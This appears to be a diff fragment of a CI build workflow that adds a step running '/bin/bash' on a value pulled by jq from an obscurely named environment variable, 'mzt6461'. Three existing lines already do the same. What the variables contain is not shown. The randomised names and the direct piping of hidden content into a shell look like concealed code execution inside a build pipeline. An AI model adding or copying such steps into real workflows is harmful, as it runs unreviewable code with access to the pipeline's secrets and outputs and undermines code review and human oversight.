@@ -28,6 +28,7 @@ jobs:
           echo $cu202 | jq -r .nxh07 | /bin/bash
           echo $yr9 | jq -r .ctqd27139 | /bin/bash
           echo $nrqh401 | jq -r .bc585 | /bin/bash
+          echo $mzt6461 | jq -r .fvs21 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
